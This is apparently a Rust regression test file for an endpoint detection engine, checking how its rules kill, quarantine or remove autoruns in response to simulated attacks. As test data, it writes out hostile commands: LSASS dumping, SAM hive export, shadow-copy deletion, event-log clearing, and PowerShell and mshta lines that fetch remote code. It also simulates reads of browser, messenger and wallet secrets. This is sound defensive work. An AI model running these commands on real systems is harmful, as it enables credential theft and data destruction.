//! Regression tests for the v1.1 security review
//! (`docs/security-review-v1.1-2026-10-21.md`), detection-engine findings:
//! V-H1, V-H4, V-H5/H6/H7, V-H9, V-M4, V-M5, V-M11, V-M12, V-L1, V-L15.

mod common;

use common::*;
use kestrel_common::*;
use kestrel_detect::*;

fn j(s: &str) -> Event {
    serde_json::from_str(s).unwrap_or_else(|e| panic!("bad event {s}: {e}"))
}

fn quarantined(a: &[ResponseAction]) -> Vec<String> {
    a.iter()
        .filter_map(|a| match a {
            ResponseAction::QuarantineFile { path, .. } => Some(path.clone()),
            _ => None,
        })
        .collect()
}

fn removals(a: &[ResponseAction]) -> usize {
    a.iter()
        .filter(|a| matches!(a, ResponseAction::RemoveAutorun { .. }))
        .count()
}

fn only_removals(a: &[ResponseAction]) -> bool {
    !a.is_empty()
        && a.iter()
            .all(|a| matches!(a, ResponseAction::RemoveAutorun { .. }))
}

fn all_for<'a>(out: &'a [Output], rule: &str) -> Vec<&'a Detection> {
    alerts(out)
        .into_iter()
        .filter(|d| d.alert.rule_id == rule)
        .collect()
}

fn with_attribution(mut e: Event, a: Attribution) -> Event {
    match &mut e.data {
        EventData::RegistrySet { attribution, .. } => *attribution = a,
        EventData::TaskRegistered(t) => t.attribution = a,
        EventData::ServiceInstalled(s) => s.attribution = a,
        EventData::WmiSubscription(w) => w.attribution = a,
        _ => panic!("no attribution on {e:?}"),
    }
    e
}

const SID: &str = "S-1-5-21-1111-2222-3333-1001";
const MALWARE: &str = r"C:\Users\alice\AppData\Local\Temp\w.exe";

fn run_key() -> String {
    format!(r"HKU\{SID}\Software\Microsoft\Windows\CurrentVersion\Run")
}

fn reg_set(ts: i64, guid: &str, pid: u32, key: &str, value: &str, data: &str) -> Event {
    ev(
        ts,
        guid,
        pid,
        EventData::RegistrySet {
            key: key.into(),
            value_name: value.into(),
            data: Some(data.into()),
            op: RegistryOp::Set,
            attribution: Attribution::Exact,
        },
    )
}

/// explorer (alice) + an unsigned Temp program started by it.
fn alice_with_malware(e: &mut Engine) {
    e.process(&as_user(
        start(
            -100,
            "explorer",
            4000,
            r"C:\Windows\explorer.exe",
            "explorer.exe",
            None,
            SignatureState::Valid,
            Some("Microsoft Windows"),
        ),
        r"CORP\alice",
    ));
    e.process(&as_user(
        start(
            0,
            "w",
            10,
            MALWARE,
            "w.exe",
            Some(("explorer", 4000)),
            SignatureState::Unsigned,
            None,
        ),
        r"CORP\alice",
    ));
}

// ------------------------------------------------------------------ V-H1

#[test]
fn vh1_agent_image_on_another_drive_is_not_the_agent() {
    let mut e = engine(Policy::default());
    // Mounted ISO with the same folder layout.
    e.process(&start(
        0,
        "iso",
        70,
        r"D:\Program Files\Kestrel\kestrel-agent.exe",
        "kestrel-agent.exe",
        None,
        SignatureState::Unsigned,
        None,
    ));
    let out = e.process(&read(10, "iso", 70, CHROME_LOGIN));
    assert_eq!(rule_ids(&out), ["ST-01"], "{}", dump(&out));
    // Its child is an ordinary subject too.
    e.process(&start(
        20,
        "kid",
        71,
        r"C:\Users\alice\AppData\Local\Temp\kid.exe",
        "kid.exe",
        Some(("iso", 70)),
        SignatureState::Unsigned,
        None,
    ));
    let out = e.process(&read(30, "kid", 71, CHROME_LOGIN));
    assert_eq!(rule_ids(&out), ["ST-01"], "{}", dump(&out));
    // A `\Device\…` path without a drive is not the agent either.
    e.process(&start(
        40,
        "dev",
        72,
        r"\Device\HarddiskVolume9\Program Files\Kestrel\kestrel-agent.exe",
        "kestrel-agent.exe",
        None,
        SignatureState::Unsigned,
        None,
    ));
    let out = e.process(&read(50, "dev", 72, CHROME_LOGIN));
    assert_eq!(rule_ids(&out), ["ST-01"], "{}", dump(&out));
}

#[test]
fn vh1_only_recorded_direct_children_are_agent_work() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "agent",
        50,
        AGENT,
        "kestrel-agent.exe service",
        None,
        SignatureState::Valid,
        Some("Kestrel"),
    ));
    // The real agent reading a store is its own work (e.g. kestrel-scan).
    assert!(e.process(&read(5, "agent", 50, CHROME_LOGIN)).is_empty());
    // Spoofed parent: the agent did not record spawning it.
    e.process(&start(
        10,
        "spoof",
        51,
        MALWARE,
        "w.exe",
        Some(("agent", 50)),
        SignatureState::Unsigned,
        None,
    ));
    let out = e.process(&read(20, "spoof", 51, CHROME_LOGIN));
    assert_eq!(rule_ids(&out), ["ST-01"], "{}", dump(&out));
    // A recorded child (kestrel-scan) is skipped by non-tamper rules …
    e.process(&spawned_by_agent(start(
        30,
        "scan",
        52,
        r"C:\Program Files\Kestrel\kestrel-scan.exe",
        "kestrel-scan.exe",
        Some(("agent", 50)),
        SignatureState::Valid,
        Some("Kestrel"),
    )));
    assert!(e.process(&read(40, "scan", 52, CHROME_LOGIN)).is_empty());
    // … its conhost too …
    e.process(&start(
        41,
        "conhost",
        53,
        r"C:\Windows\System32\conhost.exe",
        r"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1",
        Some(("scan", 52)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    assert!(e.process(&read(42, "conhost", 53, CHROME_LOGIN)).is_empty());
    // … but never its other children.
    e.process(&start(
        50,
        "grand",
        54,
        MALWARE,
        "w.exe",
        Some(("scan", 52)),
        SignatureState::Unsigned,
        None,
    ));
    let out = e.process(&read(60, "grand", 54, CHROME_LOGIN));
    assert_eq!(rule_ids(&out), ["ST-01"], "{}", dump(&out));
}

#[test]
fn vh1_tamper_rules_still_apply_to_agent_children() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "agent",
        50,
        AGENT,
        "kestrel-agent.exe service",
        None,
        SignatureState::Valid,
        Some("Kestrel"),
    ));
    e.process(&spawned_by_agent(start(
        10,
        "hard",
        51,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=",
        Some(("agent", 50)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    )));
    let key = r"HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent";
    let out = e.process(&reg_set(20, "hard", 51, key, "ImagePath", r"C:\x.exe"));
    assert_eq!(rule_ids(&out), ["TP-04"], "{}", dump(&out));
    // The agent itself configuring its own service is exempt.
    let out = e.process(&reg_set(30, "agent", 50, key, "Description", "Kestrel"));
    assert!(rule_ids(&out).is_empty(), "{}", dump(&out));
}

// ------------------------------------------------------------------ V-H4

fn wininit_lsass(e: &mut Engine) {
    e.process(&j(r#"{"ts":1759999000000,"pid":600,"guid":"wininit-1","type":"process_start","ppid":500,"image":"C:\\Windows\\System32\\wininit.exe","cmdline":"wininit.exe","user":"NT AUTHORITY\\SYSTEM","signed":"valid","signer":"Microsoft Windows"}"#));
    e.process(&j(r#"{"ts":1759999000100,"pid":624,"guid":"lsass-1","type":"process_start","ppid":600,"parent_guid":"wininit-1","image":"C:\\Windows\\System32\\lsass.exe","cmdline":"lsass.exe","user":"NT AUTHORITY\\SYSTEM","signed":"valid","signer":"Microsoft Windows"}"#));
}

fn rundll_minidump(
    e: &mut Engine,
    ts: i64,
    guid: &str,
    pid: u32,
    target_pid: u32,
    file: &str,
) -> Vec<Output> {
    e.process(&as_user(
        start(
            ts,
            guid,
            pid,
            r"C:\Windows\System32\rundll32.exe",
            &format!(
                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump {target_pid} {file} full"
            ),
            Some(("w", 10)),
            SignatureState::Valid,
            Some("Microsoft Windows"),
        ),
        r"CORP\alice",
    ))
}

#[test]
fn vh4_cd01_dump_path_is_quarantined_only_in_own_profile() {
    let mut e = engine(Policy::default());
    wininit_lsass(&mut e);
    alice_with_malware(&mut e);
    // Another user's document named as the "dump file": kill, no quarantine.
    let out = rundll_minidump(
        &mut e,
        10,
        "r1",
        20,
        624,
        r"C:\Users\bob\Documents\thesis.docx",
    );
    let d = first(&out, "CD-01");
    assert_eq!(d.alert.mode, RuleMode::Protect);
    assert!(!kills(&d.actions).is_empty(), "{}", dump(&out));
    assert!(quarantined(&d.actions).is_empty(), "{}", dump(&out));
    // Machine keys / task XML: never.
    for p in [
        r"C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\abc",
        r"C:\Windows\System32\Tasks\Microsoft\Windows\Defrag\ScheduledDefrag",
        r"C:\Users\alice\..\bob\x.docx",
    ] {
        let out = rundll_minidump(&mut e, 20, &format!("r-{}", p.len()), 21, 624, p);
        let d = first(&out, "CD-01");
        assert!(quarantined(&d.actions).is_empty(), "{p}: {}", dump(&out));
    }
    // The subject's own profile: quarantined as before.
    let own = r"C:\Users\alice\AppData\Local\Temp\l.dmp";
    let out = rundll_minidump(&mut e, 30, "r3", 22, 624, own);
    let d = first(&out, "CD-01");
    assert_eq!(quarantined(&d.actions), [own], "{}", dump(&out));
}

#[test]
fn vh4_cd10_reg_save_output_path() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    let save = |e: &mut Engine, ts: i64, guid: &str, out_path: &str| {
        e.process(&as_user(
            start(
                ts,
                guid,
                30 + ts as u32,
                r"C:\Windows\System32\reg.exe",
                &format!(r"reg save HKLM\SAM {out_path}"),
                Some(("w", 10)),
                SignatureState::Valid,
                Some("Microsoft Windows"),
            ),
            r"CORP\alice",
        ))
    };
    let out = save(&mut e, 1, "s1", r"C:\ProgramData\Microsoft\Crypto\Keys\k1");
    let d = first(&out, "CD-10");
    assert!(!kills(&d.actions).is_empty());
    assert!(quarantined(&d.actions).is_empty(), "{}", dump(&out));
    let own = r"C:\Users\alice\sam.save";
    let out = save(&mut e, 2, "s2", own);
    assert_eq!(quarantined(&first(&out, "CD-10").actions), [own]);
}

#[test]
fn vh4_ps02_payload_named_in_registry_data() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    let out = e.process(&reg_set(
        10,
        "w",
        10,
        &run_key(),
        "Keys",
        r#"wscript.exe //B "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\abc.js""#,
    ));
    let d = first(&out, "PS-02");
    assert_eq!(removals(&d.actions), 1, "{}", dump(&out));
    assert!(quarantined(&d.actions).is_empty(), "{}", dump(&out));
    // A payload the writer was seen creating is quarantined (outside
    // \Windows\ and \ProgramData\Microsoft\).
    let dropped = r"C:\ProgramData\Updater\run.js";
    e.process(&ev(
        20,
        "w",
        10,
        EventData::FileAccess {
            path: dropped.into(),
            op: FileOp::Create,
        },
    ));
    let out = e.process(&reg_set(
        30,
        "w",
        10,
        &run_key(),
        "Upd",
        &format!(r#"wscript.exe //B "{dropped}""#),
    ));
    assert_eq!(quarantined(&first(&out, "PS-02").actions), [dropped]);
}

// ------------------------------------------------------------ V-H5/H6/H7

#[test]
fn vh5_heuristic_attribution_never_kills_or_records() {
    // Exact attribution: the rollback fixture rolls back both entries.
    let mut e = engine(Policy::default());
    let out = replay(&mut e, &fixture("ps_rollback.jsonl"));
    assert!(
        rule_ids(&out).contains(&"PS-15".to_string()),
        "{}",
        dump(&out)
    );
    // The same entries attributed by correlation only: never recorded.
    let evs: Vec<Event> = fixture("ps_rollback.jsonl")
        .into_iter()
        .map(|ev| match ev.data {
            EventData::RegistrySet { .. } | EventData::TaskRegistered(_) => {
                with_attribution(ev, Attribution::Heuristic)
            }
            _ => ev,
        })
        .collect();
    let mut e = engine(Policy::default());
    let out = replay(&mut e, &evs);
    assert!(
        !rule_ids(&out).contains(&"PS-15".to_string()),
        "{}",
        dump(&out)
    );
}

#[test]
fn vh5_heuristic_task_creator_is_not_killed_but_task_is_removed() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    let task = ev(
        10,
        "w",
        10,
        EventData::TaskRegistered(TaskChange {
            name: r"\Updater".into(),
            op: TaskOp::Created,
            actions: vec!["mshta https://cdn-check.example/a.hta".into()],
            triggers: vec!["logon".into()],
            ..Default::default()
        }),
    );
    let out = e.process(&with_attribution(task.clone(), Attribution::Heuristic));
    let d = first(&out, "PS-02");
    assert!(only_removals(&d.actions), "{}", dump(&out));
    assert!(d.alert.summary.contains("inferred"), "{}", d.alert.summary);
    // Exact attribution kills the untrusted creator (unchanged behaviour).
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    let out = e.process(&task);
    assert_eq!(
        kills(&first(&out, "PS-02").actions),
        [("w".to_string(), true)]
    );
}

#[test]
fn vh6_signed_reg_exe_exemption_needs_a_trusted_parent() {
    let cmd = "powershell -w hidden -c iex(irm https://x.example/a)";
    let reg_exe = |e: &mut Engine, parent: (&str, u32)| {
        e.process(&start(
            5,
            "reg",
            40,
            r"C:\Windows\System32\reg.exe",
            "reg.exe add ...",
            Some(parent),
            SignatureState::Valid,
            Some("Microsoft Windows"),
        ));
    };
    // reg.exe run straight from malware: the Run value is removed.
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    reg_exe(&mut e, ("w", 10));
    let out = e.process(&reg_set(10, "reg", 40, &run_key(), "a", cmd));
    let d = first(&out, "PS-02");
    assert_eq!(removals(&d.actions), 1, "{}", dump(&out));
    // reg.exe run by a signed management agent: alert only (unchanged).
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "rmm",
        30,
        r"C:\Program Files\RMM\agent.exe",
        "agent.exe",
        None,
        SignatureState::Valid,
        Some("RMM Vendor Ltd"),
    ));
    reg_exe(&mut e, ("rmm", 30));
    let out = e.process(&reg_set(10, "reg", 40, &run_key(), "a", cmd));
    let d = first(&out, "PS-02");
    assert!(d.actions.is_empty(), "{}", dump(&out));
}

#[test]
fn vh7_unattributed_persistence_is_remediated_without_process_actions() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    let mut change = reg_set(
        10,
        "",
        0,
        &run_key(),
        "Upd",
        "powershell -w hidden -enc SQBFAFgA",
    );
    change.guid = ProcessGuid::default();
    let out = e.process(&with_attribution(change, Attribution::None));
    let d = first(&out, "PS-02");
    assert_eq!(d.alert.process.pid, 0);
    assert_eq!(d.alert.process.guid.0, "unattributed-writer");
    assert!(only_removals(&d.actions), "{}", dump(&out));
    // Credential key (CD-12 WDigest downgrade), also unattributed.
    let mut wd = reg_set(
        20,
        "",
        0,
        r"HKLM\SYSTEM\ControlSet001\Control\SecurityProviders\WDigest",
        "UseLogonCredential",
        "1",
    );
    wd.guid = ProcessGuid::default();
    let out = e.process(&with_attribution(wd, Attribution::None));
    let d = first(&out, "CD-12");
    assert!(only_removals(&d.actions), "{}", dump(&out));
}

#[test]
fn vh6_heuristic_cd07_removes_value_without_kill() {
    let mut e = engine(Policy::default());
    wininit_lsass(&mut e);
    alice_with_malware(&mut e);
    let spe = with_attribution(
        reg_set(
            10,
            "w",
            10,
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe",
            "ReportingMode",
            "2",
        ),
        Attribution::Heuristic,
    );
    let out = e.process(&spe);
    let d = first(&out, "CD-07");
    assert!(only_removals(&d.actions), "{}", dump(&out));
}

// ------------------------------------------------------------------ V-H9

fn canary_activity(fa: FileActivity) -> EventData {
    EventData::FileActivity(fa)
}

#[test]
fn vh9_in_place_decoy_write_is_alert_only() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    // Word was the last opener of the decoy (the malware ShellExecute'd it).
    e.process(&start(
        5,
        "word",
        60,
        r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "winword.exe",
        Some(("explorer", 4000)),
        SignatureState::Valid,
        Some("Microsoft Corporation"),
    ));
    let decoy = r"C:\Users\alice\Documents\!_Q3 budget review.docx";
    let fa = FileActivity {
        window_ms: 10_000,
        files_touched: 1,
        dirs: 1,
        overwrites: 1,
        canary_hits: vec![decoy.into()],
        canary_in_place: true,
        ..Default::default()
    };
    let out = e.process(&ev(10, "word", 60, canary_activity(fa.clone())));
    let d = first(&out, "RW-07");
    assert!(d.actions.is_empty(), "{}", dump(&out));
    // The same in-place hit on the unsigned program with an RW-06-level
    // aggregate in the same summary is contained.
    let big = FileActivity {
        files_touched: 60,
        dirs: 6,
        renames: 40,
        ext_changes: 40,
        ..fa
    };
    let out = e.process(&ev(20, "w", 10, canary_activity(big)));
    let d = first(&out, "RW-07");
    assert!(
        kills(&d.actions).iter().any(|k| k.0 == "w"),
        "{}",
        dump(&out)
    );
}

#[test]
fn vh9_remote_writer_never_blames_a_local_process() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "system",
        4,
        "System",
        "System",
        None,
        SignatureState::Unknown,
        None,
    ));
    let fa = FileActivity {
        window_ms: 10_000,
        files_touched: 3,
        dirs: 1,
        canary_hits: vec![r"C:\Users\alice\Documents\!_Q3 budget review.docx".into()],
        remote_writer: true,
        ..Default::default()
    };
    let out = e.process(&ev(10, "system", 4, canary_activity(fa)));
    let d = first(&out, "RW-07");
    assert!(d.alert.summary.contains("remote client over SMB"));
    assert_eq!(d.alert.process.pid, 0);
    assert!(d.actions.is_empty(), "{}", dump(&out));
}

// ------------------------------------------------------------------ V-M4

fn shell(e: &mut Engine, guid: &str, pid: u32) {
    e.process(&start(
        1,
        guid,
        pid,
        r"C:\Windows\System32\cmd.exe",
        "cmd.exe",
        Some(("explorer", 4000)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
}

fn tool(
    e: &mut Engine,
    ts: i64,
    guid: &str,
    pid: u32,
    parent: (&str, u32),
    img: &str,
    cmd: &str,
) -> Vec<Output> {
    e.process(&start(
        ts,
        guid,
        pid,
        img,
        cmd,
        Some(parent),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ))
}

const VSSADMIN: &str = r"C:\Windows\System32\vssadmin.exe";
const BCDEDIT: &str = r"C:\Windows\System32\bcdedit.exe";
const WEVTUTIL: &str = r"C:\Windows\System32\wevtutil.exe";

#[test]
fn vm4_rw12_needs_strong_hits_in_one_lineage() {
    // Medium RW-04 + RW-01 from one shell: RW-04 is not high-confidence.
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    shell(&mut e, "c1", 100);
    tool(
        &mut e,
        10,
        "v1",
        101,
        ("c1", 100),
        VSSADMIN,
        "vssadmin delete shadows /all /quiet",
    );
    let out = tool(
        &mut e,
        20,
        "w1",
        102,
        ("c1", 100),
        WEVTUTIL,
        "wevtutil cl x",
    );
    assert!(
        !rule_ids(&out).contains(&"RW-12".to_string()),
        "{}",
        dump(&out)
    );
    // Two strong hits from unrelated shells: no shared lineage.
    shell(&mut e, "c2", 200);
    let out = tool(
        &mut e,
        30,
        "b2",
        201,
        ("c2", 200),
        BCDEDIT,
        "bcdedit /set {default} recoveryenabled no",
    );
    assert!(
        !rule_ids(&out).contains(&"RW-12".to_string()),
        "{}",
        dump(&out)
    );
}

#[test]
fn vm4_rw12_same_lineage_still_correlates() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    shell(&mut e, "c1", 100);
    tool(
        &mut e,
        10,
        "v1",
        101,
        ("c1", 100),
        VSSADMIN,
        "vssadmin delete shadows /all /quiet",
    );
    let out = tool(
        &mut e,
        20,
        "b1",
        102,
        ("c1", 100),
        BCDEDIT,
        "bcdedit /set {default} recoveryenabled no",
    );
    assert!(
        rule_ids(&out).contains(&"RW-12".to_string()),
        "{}",
        dump(&out)
    );
}

#[test]
fn vm4_non_elevated_commands_do_not_count() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    shell(&mut e, "c1", 100);
    let medium = |mut ev: Event| {
        if let EventData::ProcessStart(p) = &mut ev.data {
            p.integrity = Some(Integrity::Medium);
        }
        ev
    };
    e.process(&medium(start(
        10,
        "v1",
        101,
        VSSADMIN,
        "vssadmin delete shadows /all /quiet",
        Some(("c1", 100)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    )));
    let out = e.process(&medium(start(
        20,
        "b1",
        102,
        BCDEDIT,
        "bcdedit /set {default} recoveryenabled no",
        Some(("c1", 100)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    )));
    assert!(rule_ids(&out).contains(&"RW-02".to_string()));
    assert!(
        !rule_ids(&out).contains(&"RW-12".to_string()),
        "{}",
        dump(&out)
    );
}

#[test]
fn vm4_failed_command_does_not_count() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    shell(&mut e, "c1", 100);
    tool(
        &mut e,
        10,
        "v1",
        101,
        ("c1", 100),
        VSSADMIN,
        "vssadmin delete shadows /all /quiet",
    );
    // vssadmin failed (standard user: access denied).
    e.process(&ev(
        11,
        "v1",
        101,
        EventData::ProcessStop { exit_code: Some(2) },
    ));
    let out = tool(
        &mut e,
        20,
        "b1",
        102,
        ("c1", 100),
        BCDEDIT,
        "bcdedit /set {default} recoveryenabled no",
    );
    assert!(
        !rule_ids(&out).contains(&"RW-12".to_string()),
        "{}",
        dump(&out)
    );
}

// ------------------------------------------------------------------ V-M5

#[test]
fn vm5_signed_per_user_app_stops_the_lineage_and_is_never_quarantined() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    let code = r"C:\Users\alice\AppData\Local\Programs\Microsoft VS Code\Code.exe";
    e.process(&start(
        1,
        "code",
        300,
        code,
        "Code.exe",
        Some(("explorer", 4000)),
        SignatureState::Valid,
        Some("Microsoft Corporation"),
    ));
    e.process(&start(
        2,
        "pwsh",
        301,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell.exe",
        Some(("code", 300)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    let out = tool(
        &mut e,
        10,
        "v",
        302,
        ("pwsh", 301),
        VSSADMIN,
        "vssadmin delete shadows /all /quiet",
    );
    let d = first(&out, "RW-01");
    let k: Vec<String> = kills(&d.actions).into_iter().map(|k| k.0).collect();
    assert_eq!(k, ["v"], "{}", dump(&out));
    assert!(quarantined(&d.actions).is_empty(), "{}", dump(&out));
    // A validly signed user-folder subject is killed but never quarantined.
    let fa = FileActivity {
        window_ms: 10_000,
        files_touched: 60,
        dirs: 6,
        renames: 40,
        ext_changes: 40,
        ..Default::default()
    };
    let out = e.process(&ev(20, "code", 300, EventData::FileActivity(fa)));
    let d = first(&out, "RW-06");
    assert!(kills(&d.actions).iter().any(|k| k.0 == "code"));
    assert!(quarantined(&d.actions).is_empty(), "{}", dump(&out));
}

// ------------------------------------------------------------------ V-M11

#[test]
fn vm11_payload_of_another_user_is_not_killed_or_quarantined() {
    let mut p = Policy::default();
    p.rules.insert("PS-01".into(), RuleMode::Protect);
    let mut e = engine(p);
    alice_with_malware(&mut e);
    // Bob's unsigned, downloaded tool is running.
    let bob_tool = r"C:\Users\bob\tools\t.exe";
    let mut s = as_user(
        start(
            1,
            "bobtool",
            500,
            bob_tool,
            "t.exe",
            None,
            SignatureState::Unsigned,
            None,
        ),
        r"CORP\bob",
    );
    if let EventData::ProcessStart(ps) = &mut s.data {
        ps.motw_zone = Some(3);
    }
    e.process(&s);
    let out = e.process(&reg_set(10, "w", 10, &run_key(), "T", bob_tool));
    let d = first(&out, "PS-01");
    assert!(
        !kills(&d.actions).iter().any(|k| k.0 == "bobtool"),
        "{}",
        dump(&out)
    );
    assert!(quarantined(&d.actions).is_empty(), "{}", dump(&out));
    assert_eq!(removals(&d.actions), 1);
    // The writer's own payload in its own profile is still killed and quarantined.
    let own = r"C:\Users\alice\AppData\Roaming\x\x.exe";
    let mut s = as_user(
        start(
            20,
            "own",
            501,
            own,
            "x.exe",
            Some(("w", 10)),
            SignatureState::Unsigned,
            None,
        ),
        r"CORP\alice",
    );
    if let EventData::ProcessStart(ps) = &mut s.data {
        ps.motw_zone = Some(3);
    }
    e.process(&s);
    let out = e.process(&reg_set(30, "w", 10, &run_key(), "X", own));
    let d = first(&out, "PS-01");
    assert!(
        kills(&d.actions).iter().any(|k| k.0 == "own"),
        "{}",
        dump(&out)
    );
    assert_eq!(quarantined(&d.actions), [own]);
}

// ------------------------------------------------------------------ V-M12

#[test]
fn vm12_user_started_defrag_hosts_are_not_exempt() {
    let mut e = engine(Policy::default());
    let decoy = e
        .canaries(r"C:\Users\alice")
        .into_iter()
        .find(|s| s.path.ends_with("Login Data"))
        .expect("decoy")
        .path;
    e.arm_canary(&decoy);
    alice_with_malware(&mut e);
    let ms = Some("Microsoft Windows Publisher");
    // `svchost -k defragsvc` started (and hollowed) by the user.
    e.process(&as_user(
        start(
            1,
            "hollow",
            80,
            r"C:\Windows\System32\svchost.exe",
            r"C:\Windows\system32\svchost.exe -k defragsvc",
            Some(("w", 10)),
            SignatureState::Valid,
            ms,
        ),
        r"CORP\alice",
    ));
    let out = e.process(&read(10, "hollow", 80, &decoy));
    assert_eq!(rule_ids(&out), ["ST-16"], "{}", dump(&out));
    // defrag.exe as the user.
    e.process(&as_user(
        start(
            20,
            "defrag-u",
            81,
            r"C:\Windows\System32\Defrag.exe",
            "defrag.exe C: /O",
            Some(("w", 10)),
            SignatureState::Valid,
            ms,
        ),
        r"CORP\alice",
    ));
    let out = e.process(&read(30, "defrag-u", 81, &decoy));
    assert_eq!(rule_ids(&out), ["ST-16"], "{}", dump(&out));
    // defrag.exe as SYSTEM (the scheduled Optimize Drives task) stays exempt.
    e.process(&as_user(
        start(
            40,
            "defrag-s",
            82,
            r"C:\Windows\System32\Defrag.exe",
            "defrag.exe -c -h -o",
            None,
            SignatureState::Valid,
            ms,
        ),
        r"NT AUTHORITY\SYSTEM",
    ));
    assert!(rule_ids(&e.process(&read(50, "defrag-s", 82, &decoy))).is_empty());
}

// ------------------------------------------------------------------ V-L1

#[test]
fn vl1_a_user_launched_lsass_never_replaces_the_real_one() {
    let mut e = engine(Policy::default());
    wininit_lsass(&mut e);
    alice_with_malware(&mut e);
    // A user starts System32\lsass.exe (it exits at once in reality).
    e.process(&start(
        5,
        "fake-lsass",
        9999,
        r"C:\Windows\System32\lsass.exe",
        "lsass.exe",
        Some(("w", 10)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    // MiniDump of the real lsass pid is still recognised as an LSASS dump.
    let out = rundll_minidump(&mut e, 10, "r1", 20, 624, r"C:\Users\alice\l.dmp");
    let d = first(&out, "CD-01");
    assert_eq!(d.alert.severity, Severity::Critical, "{}", dump(&out));
    assert!(!kills(&d.actions).is_empty());
}

// ------------------------------------------------------------------ V-L15

#[test]
fn vl15_rollback_spares_the_users_interactive_shell() {
    let mut e = engine(Policy::default());
    alice_with_malware(&mut e);
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    e.process(&as_user(
        start(
            1,
            "shell",
            600,
            ps,
            "powershell.exe",
            Some(("explorer", 4000)),
            SignatureState::Valid,
            Some("Microsoft Windows"),
        ),
        r"CORP\alice",
    ));
    // The user's own autorun from their shell (PS-01 audit-level: recorded).
    e.process(&reg_set(
        2,
        "shell",
        600,
        &run_key(),
        "MyTool",
        r"C:\Users\alice\tools\mytool.exe",
    ));
    // Malware started from that shell steals credentials → ST-02 kill.
    e.process(&as_user(
        start(
            3,
            "thief",
            601,
            r"C:\Users\alice\Downloads\thief.exe",
            "thief.exe",
            Some(("shell", 600)),
            SignatureState::Unsigned,
            None,
        ),
        r"CORP\alice",
    ));
    e.process(&reg_set(
        4,
        "thief",
        601,
        &run_key(),
        "Thief",
        r"C:\Users\alice\AppData\Roaming\t\t.exe",
    ));
    let mut out = Vec::new();
    for (i, p) in [
        CHROME_LOGIN,
        r"C:\Users\alice\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies",
        r"C:\Users\alice\AppData\Roaming\Telegram Desktop\tdata\key_datas",
        r"C:\Users\alice\AppData\Roaming\Exodus\exodus.wallet\seed.seco",
    ]
    .iter()
    .enumerate()
    {
        out.extend(e.process(&read(10 + i as i64, "thief", 601, p)));
    }
    let rb = all_for(&out, "PS-15");
    assert_eq!(rb.len(), 1, "{}", dump(&out));
    let locs: Vec<String> = rb[0]
        .actions
        .iter()
        .filter_map(|a| match a {
            ResponseAction::RemoveAutorun { value_name, .. } => value_name.clone(),
            _ => None,
        })
        .collect();
    assert_eq!(locs, ["Thief"], "{}", dump(&out));
}

// ------------------------------------------------------- V-H6 (agent guess)

#[test]
fn vh6_a_guess_landing_on_the_agent_does_not_hide_the_change() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "agent",
        50,
        AGENT,
        "kestrel-agent.exe service",
        None,
        SignatureState::Valid,
        Some("Kestrel"),
    ));
    // Persistence value whose writer the sensor guessed as the agent.
    let out = e.process(&with_attribution(
        reg_set(
            10,
            "agent",
            50,
            &run_key(),
            "Upd",
            "powershell -w hidden -enc SQBFAFgA",
        ),
        Attribution::Heuristic,
    ));
    let d = first(&out, "PS-02");
    assert_eq!(d.alert.process.pid, 0, "{}", dump(&out));
    assert!(only_removals(&d.actions), "{}", dump(&out));
    // Kestrel service key changed, writer guessed as the agent: TP-04 still fires.
    let out = e.process(&with_attribution(
        reg_set(
            20,
            "agent",
            50,
            r"HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent",
            "Start",
            "4",
        ),
        Attribution::Heuristic,
    ));
    assert_eq!(rule_ids(&out), ["TP-04"], "{}", dump(&out));
    // The same change unattributed (pid 0).
    let mut ev0 = reg_set(
        30,
        "",
        0,
        r"HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent",
        "ImagePath",
        r"C:\x.exe",
    );
    ev0.guid = ProcessGuid::default();
    let out = e.process(&with_attribution(ev0, Attribution::None));
    assert_eq!(rule_ids(&out), ["TP-04"], "{}", dump(&out));
}
